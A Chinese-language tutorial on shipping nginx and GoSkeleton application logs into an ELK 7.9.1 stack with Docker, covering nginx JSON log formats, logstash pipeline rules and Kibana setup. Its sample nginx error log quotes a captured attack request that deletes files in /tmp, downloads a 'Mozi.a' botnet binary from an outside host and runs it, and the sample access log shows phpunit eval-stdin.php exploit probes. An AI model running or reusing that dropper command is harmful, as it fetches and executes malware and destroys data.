###    1.项目日志的顶级解决方案(ELK)   
> 1.`ELK` 全称为 `Elasticsearch`、`Logstash`、`Kibana`, 该产品近年在提供快速搜索领域异军突起,但是今天我们要介绍的是该套产品的另一杀手锏：日志统一管理、统计、分析.    
> 2.`ELK` 支持分布式管理日志，您只需要搭建 `elk` 服务器，所有项目的日志(例如：`nginx` 的 `access` 日志、`error` 日志、应用项目运行日志)都可以对接到 `elk` 服务器，由专门的人员负责数据监控，统计、分析.     
> 3.`ELK` 日志推送结构图：
>![elk日志推送结构图](https://www.ginskeleton.com/images/elk_struct.png)   
    
###  2.三个核心角色介绍    
> **elasticsearch**：  
>    倒排索引驱动的数据库，通俗地说，就是数据存储时，按照分词器提取关键词，给关键词创建索引，然后将索引和数据一起存储，最终当你查询关键词的时候，首先定位索引，然后根据索引快速获取结果，返回给用户。   
> **logstash**：  
>    负责数据的采集、加工处理、输出，我们只需要设置好相关参数，按照指定时间频率，抓取日志文件，支持分布式部署，一台项目服务器需要部署一个客户端，然后将数据推送至elasticsearch存.    
> **kibana**：   
>    数据可视化管理面板，支持数据本身的展示（文本展示）、图形化展示、统计、分析等.  

###  3.本次我们要对接的日志清单    
>   1.nginx 的 access.log.  
>   2.nginx 的 error.log.  
>   3.本项目骨架 的 goskeleton.log ,该日志是项目运行日志,按照行业标准提供了 info 、 warn 、error 、fatal 等不同级别日志.    
>   提醒：本项目骨架版本 >= v1.3.00, 则 `storage/logs/goskeleton.log` 格式已经默认设置ok（json格式，记录的时间字段已经调整为 created_at）,否则，请您升级版本至最新版，或者自行修改配置文件 config/config.yml 中的日志部分，
 修改日志格式为 json，此外还需要调整一个地方：
 参见最新版本代码 app/utils/zap_factory/zap_factory.go ，47行，重新定义日志记录的时间字段：encoderConfig.TimeKey = "created_at"

### 4.进入对接环节  
> 1.后续所有方案基于docker.  
> 2.考虑到有部分人员可能没有安装 elk 黄金套餐,我们简要地介绍一下安装步骤,如果已经安装，那么相关参数请自行配置.  
> 3.特别提醒：本次我们是基于 elk 最新版本（v7.9.1）,距离我写本文档的时间（2020-09-21）发布仅仅16天, 和之前的版本细节差异都比较大, 和网上已有的资料差距也很大（很有可能v7.9.1的全套对接、配置我们都是全网首发）, 如果您不是很熟悉该套产品，那么请按照本文档 100% 操作,否则有很多"惊喜".    

#### 4.1 nginx 修改日志格式
> 4.1.1 例如我的nginx配置文件路径：`/usr/local/nginx/conf/nginx.conf`    
```code  
#以下代码段需要放置在http段
    http {
        include       mime.types;
        default_type  application/octet-stream;

        #默认的日志格式
        #log_format  main  '$remote_addr - $remote_user [$time_local] "$request" '
        #                  '$status $body_bytes_sent "$http_referer" '
        #                  '"$http_user_agent" "$http_x_forwarded_for"';
        #access_log  logs/access.log  main;

        # 将日志格式修改为 json 格式，方便对接到 elk ，修改日志格式对 nginx 没有任何影响,只会使日志阅读更加人性化
        log_format json '{"created_at":"$time_iso8601",'
                           '"url":"$uri",'
                           '"args":"$args",'
                           '"remote_addr":"$remote_addr",'
                           '"method":"$request_method",'
                           '"request":"$request",'
                           '"status":"$status",'
                           '"size":$body_bytes_sent,'
                           '"referer": "$http_referer",'
                           '"http_host":"$http_host",'
                           '"response_time":$request_time,'
                           '"http_x_forwarded_for":"$http_x_forwarded_for",'
                           '"user_agent": "$http_user_agent"'
               '}';

        # 设置日志存储路径，一个项目一个文件
        access_log /usr/local/nginx/logs/nginx001_access.log json;
        error_log /usr/local/nginx/logs/nginx001_error.log;
    
    #省略其他nginx配置
    
    }

#重启 nginx 容器，或者重新加载配置文件，检查access日志格式为json格式，错误日志保持 nginx 默认格式即可

```  
> 4.1.2 最终的日志格式效果, 总之原则就是access日志必须是json格式，error 格式保持默认即可.    
```code  
# nginx001_access.log 日志
{"created_at":"2020-09-21T03:57:35+08:00","time_local":"21/Sep/2020:03:57:35 +0800","remote_addr":"45.146.164.186","method":"GET","request":"GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1","status":"404","size":555,"referer": "-","http_host":"49.232.145.118:80","response_time":0.274,"http_x_forwarded_for":"-","user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"}
{"created_at":"2020-09-21T04:02:19+08:00","time_local":"21/Sep/2020:04:02:19 +0800","remote_addr":"45.146.164.186","method":"POST","request":"POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1","status":"404","size":555,"referer": "-","http_host":"49.232.145.118:80","response_time":0.273,"http_x_forwarded_for":"-","user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"}
{"created_at":"2020-09-21T04:04:22+08:00","time_local":"21/Sep/2020:04:04:22 +0800","remote_addr":"78.188.205.21","method":"GET","request":"GET / HTTP/1.1","status":"200","size":199,"referer": "-","http_host":"49.232.145.118:80","response_time":0.000,"http_x_forwarded_for":"-","user_agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"}
{"created_at":"2020-09-21T04:58:00+08:00","time_local":"21/Sep/2020:04:58:00 +0800","remote_addr":"192.241.221.22","method":"GET","request":"GET / HTTP/1.1","status":"200","size":199,"referer": "-","http_host":"49.232.145.118","response_time":0.000,"http_x_forwarded_for":"-","user_agent": "Mozilla/5.0 zgrab/0.x"}

# nginx001_error.log 日志
2020/09/21 00:57:00 [error] 6#0: *26 open() "/usr/local/nginx/html/elrekt.php" failed (2: No such file or directory), client: 106.52.153.48, server: localhost, request: "GET /elrekt.php HTTP/1.1", host: "49.232.145.118"
2020/09/21 00:57:00 [error] 6#0: *27 open() "/usr/local/nginx/html/index.php" failed (2: No such file or directory), client: 106.52.153.48, server: localhost, request: "GET /index.php HTTP/1.1", host: "49.232.145.118"
2020/09/21 01:50:50 [error] 6#0: *30 open() "/usr/local/nginx/html/shell" failed (2: No such file or directory), client: 123.96.229.15, server: localhost, request: "GET /shell?cd+/tmp;rm+-rf+*;wget+http://123.96.229.15:35278/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1", host: "49.232.145.118:80"
# 可能还有其他的错误格式
2018/07/09 16:50:34 [error] 78175#0: *21132 FastCGI sent in stderr: "PHP message: PHP Warning:  Unknown: open_basedir restriction in effect. File(/usr/local/jenkins_manage_project/2018/bestbox_first/public/index.php) is not within the allowed path(s): (/home/wwwroot/:/tmp/:/proc/) in Unknown on line 0
PHP message: PHP Warning:  Unknown: failed to open stream: Operation not permitted in Unknown on line 0
Unable to open primary script: /usr/local/jenkins_manage_project/2018/bestbox_first/public/index.php (Operation not permitted)" while reading response header from upstream, client: 192.168.6.85, server: 192.168.8.62, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/tmp/php-cgi.sock:", host: "192.168.8.62"

```

#### 4.2 elasticsearch 安装  
```code  
docker pull elasticsearch:7.9.1  
docker run --name  elastic7  -p 9200:9200 -p 9300:9300 -e "discovery.type=single-node" -d elasticsearch:7.9.1

#修改容器时间为北京时间，fea8df018c15 为刚启动的容器ID, 请自行替换  
docker   cp  /usr/share/zoneinfo/Asia/Shanghai   fea8df018c15:/etc/localtime

#进入容器修改内存, 如果您的服务器内存超过 8g, 请忽略
docker  exec  -it  elasticsearch7  /bin/bash
# 文件位置： /usr/share/elasticsearch/config/jvm.options,默认配置为1g,修改如下：
 -Xms512m
 -Xmx512m

#重启容器
docker restart  elasticsearch7

```
#### 4.3 kibana 安装  
```code  
docker pull kibana:7.9.1
docker run --name  kibana7 --link elastic7:elasticsearch -p 5601:5601    -d  kibana:7.9.1 
.
#修改容器时间为北京时间，ffe8df018624 为刚启动的容器ID, 请自行替换  
docker   cp  /usr/share/zoneinfo/Asia/Shanghai   ffe8df018624:/etc/localtime

#进入容器修改内存, kibana设置
docker  exec  -it  kibana7  /bin/bash

vi  /usr/share/kibana/config/kibana.yml
#修改参数如下，没有的选项复制添加即可
i18n.locale: "zh-CN"
xpack.spaces.enabled: false
# Default Kibana configuration for docker target
server.name: kibana
server.host: "0"
elasticsearch.hosts: [ "http://elasticsearch:9200" ]
monitoring.ui.container.elasticsearch.enabled: true

#重启容器
docker restart  kibana7

```

#### 4.4 logstash 安装  
> 4.4.1 由于logstash 需要修改、配置的地方特别多，而且本次的难度基本都集中的这块儿，因此，配置文件等需要频繁修改的变动的我们映射出来.  
```code  
docker pull logstash:7.9.1
# goskeleton 请确保版本 >= v1.3.00 版本，默认配置项开启了日志 json 格式，如果老日志不是json，请自行重命名备份原始文件，新日志确保 100% json格式。    
# 以下涉及到的参数需要您根据您的实际情况修改
# 启动 logstash 容器，注意这里有两个映射目录，第一个是配置文件目录，第二个是 nginx 日志目录（包括 access、error 日志），第三个是 goskeleton.log 映射    
docker    container    run  --name    logstash7  -d    -v  /home/mysoft/logstash/conf/:/usr/share/logstash/pipeline/    -v   /home/wwwlogs/project_log/:/usr/share/data/project_log/nginx/   -v /home/wwwroot/project2020/goskeleton/storage/logs/:/usr/share/data/project_log/goskeleton/  logstash:7.9.1

#修改容器时间为北京时间，ffe8df018624 为刚启动的容器ID, 请自行替换  
docker   cp  /usr/share/zoneinfo/Asia/Shanghai   ffe8df018624:/etc/localtime

#进入容器修改一些内存参数, 如果您的服务器内存超过 8g, 请忽略
docker  exec  -it  logstash7  /bin/bash
#文件位置：/usr/share/logstash/config/jvm.options，默认配置为1g，修改如下：
 -Xms512m
 -Xmx512m

#修改x-pack设置项，该插件负责客户端登录服务器的认证
#文件位置：/usr/share/logstash/config/logstash.yml ,修改如下
http.host: "0.0.0.0"
xpack.monitoring.enabled: true   #启动x-pack插件，172.21.0.13 为 elk 服务器的ip，请自行替换   
xpack.monitoring.elasticsearch.hosts: [ "http://172.21.0.13:9200" ] 

#退出容器，重启logstash
docker restart  logstash

```
> 4.4.2 接下来我们继续修改数据采集配置项,主要是实现采集 nginx 的 access、error 日志, goskeleton 项目的运行日志到 elk 服务器 .   
> logstash配置文件我们已经映射出来了，相关位置： `/home/mysoft/logstash/conf/logstash.conf`  
> 以下配置必须完全按照我们提供的文档操作，否则很容易报错，全程必须是小写，不小心使用大写都有可能都会报错.  
```code   
#数据采集规则
input {
    # nginx 日志采集配置
   file {
        type => "nginx001"  #可以自行定义，方便后面判断，但是不要使用大写，否则报错
        path => "/usr/share/data/project_log/nginx/nginx001_access.log"
        start_position => "beginning"  # 从日志其实位置采集
        stat_interval => "3"    # 采集频率为 3 秒
        #  下一行不要提前将原始数据转换为 json ，否则后面坑死你，不要相信 elk 之前版本的文档资料 
        # codec => json
   }
    
    # goskeleton 日志采集配置
    file {
    type => "goskeleton" 
    path => "/usr/share/data/project_log/goskeleton/goskeleton.log"
    start_position => "beginning"
    stat_interval => "3"
    # codec => json
   }


   # nginx 错误日志采集配置
   file {
        type => "nginxerr"  
        path => "/usr/share/data/project_log/nginx/nginx001_error.log"
        start_position => "beginning"
        stat_interval => "3"
        # plain 表示采集的数据是 文本格式，非 json 
        codec => plain
   }
 

}

#数据过滤规则
filter {
       # 非 nginx 的 error log，都是 json 格式，那么在这里进行 json 格式化 
      if [type]  != "nginxerr"  {
            json{
                #每一条数据就是一个消息事件（message）
                source => "message"
            }
      }
    
    # 根据设置的类型动态设置 索引模式(index pattern )
	if [type] == "nginx001" {
      
       # 注意：索引模式 以 logstash- 开头，表示使用系统默认json解析模板，否则又要自己定义解析模板，此外，注意全程小写.  
	   mutate { add_field => { "[@metadata][target_index]" => "logstash-nginx001-%{+YYYY.MM.dd}" } }
	   
	   # 建议同时开启 ip 位置转换功能，这样在 logstash 就能自动统计访问者的地理位置分布
	       geoip {
                source => "remote_addr"
                target => "geoip"
                # ip 与经纬度转换城市数据库下载地址：https://dev.maxmind.com/geoip/geoip2/downloadable/  （需要注册账号才能有下载地址）
                # 数据库文件放置在logstash容器映射的日志目录，不要放在配置文件目录，会报错。  
                database => "/usr/share/data/testlog/GeoLite2-City.mmdb"
            }

	}else if [type] == "goskeleton" {

           mutate { add_field => { "[@metadata][target_index]" => "logstash-goskeleton-%{+YYYY.MM.dd}" } }

    }else if [type]=="nginxerr"{

	   mutate { add_field => { "[@metadata][target_index]" => "logstash-nginxerr-%{+YYYY.MM.dd}" } }

	}else {

	 mutate { add_field => { "[@metadata][target_index]" => "logstash-unknowindex-%{+YYYY.MM.dd}" } }
	}

      # 匹配 nginx 错误日志,将原始文本进行 json 化
   if [type]=="nginxerr" {      
      grok {
           match => [ "message" , "(?<created_at>%{YEAR}[./-]%{MONTHNUM2}[./-]%{MONTHDAY} %{TIME:time2}) \[%{WORD:errLevel}]  (?<errMsg>([\w\W])*), client\: %{IP:clientIp}(, server\: %{IPORHOST:server})?(, request\: \"%{DATA:request}\")?(, upstream\: \"%{DATA:upstream}\")?(, host\: \"%{DATA:host}\")?"  ]
        }	
   }

      #删除一些多余字段
    mutate {
         remove_field => [ "message","@version"]
    }

}

output {
   #将最终处理的结果输出到调试面板（控制台），您可以开启，先观察处理结果是否是您期待的，确保正确之后，注释掉即可
   #stdout { codec => rubydebug }

	# 官方说，这里每出现一个 elasticsearch 都是一个数据库客户端连接，建议用一个连接一次性输出多个日志内容到 elk ，像如下这样
    # 这样配置可以最大减少 elk 服务器的连接数，减小压力，因为 elk 今后将管理所有项目的日志，数据处理压力会非常大  
       elasticsearch  {
        # 172.21.0.13 请自行替换为您的 elk 服务器地址
         hosts => ["http://172.21.0.13:9200"]
         index => "%{[@metadata][target_index]}"
     }
}

#配置完毕，重启容器 
docker  restart  logstash

#可以观察近3分钟的日志，确保配置正确，启动正常 
docker  logs  --since  3m logstash7  

```

> 4.4.3 现在我们可以访问kibana地址：`http://172.21.0.13:5601` , 如果是云服务器就使用外网地址访问即可.  
> 以下操作基本都是可视化界面，通过鼠标点击等操作完成，我就以截图展示一个完整的主线操作流程, 其他知识请自行查询官网或者加我们的项目群咨询讨论.  
![步骤1](https://www.ginskeleton.com/images/elk001.png)     
![步骤2](https://www.ginskeleton.com/images/elk002.png)      
![步骤3](https://www.ginskeleton.com/images/elk003.png)      
![步骤4](https://www.ginskeleton.com/images/elk004.png)      

> 特别说明：以下数据是基于测试环境, 有一些数据是直接把老项目的日志文件覆盖到指定位置，所以界面的查询日期跨度比较大.  
> nginx access 的日志  
![nginx_access日志](https://www.ginskeleton.com/images/elk005.png)        

>> goskeleton 的日志  
![goskeleton的elk日志](https://www.ginskeleton.com/images/elk006.png)   

> nginx error 的日志  
![nginx_access日志](https://www.ginskeleton.com/images/elk007.png)      

   
#### 5.更炫酷未来  
> 基于以上数据我们可以在 elk 做数据统计、分析，例如：可视化展示网站访问量. 哪些接口访问最多、哪些接口访问最耗时，就需要优先优化。
> elk 能做的事情超乎你的想象(机器学习、数据关联性分析、地理位置分布分析、各种图形化等等), 请参考官方提供的可视化模板，自己做数据展示设计即可。  
> 比较遗憾的是我们做的模板无法直接分享给其他人,只能分享最终的效果，其他开发者可自行参考制作自己的展示模板.          
![logstash样图](https://www.ginskeleton.com/images/logstash1.png)  


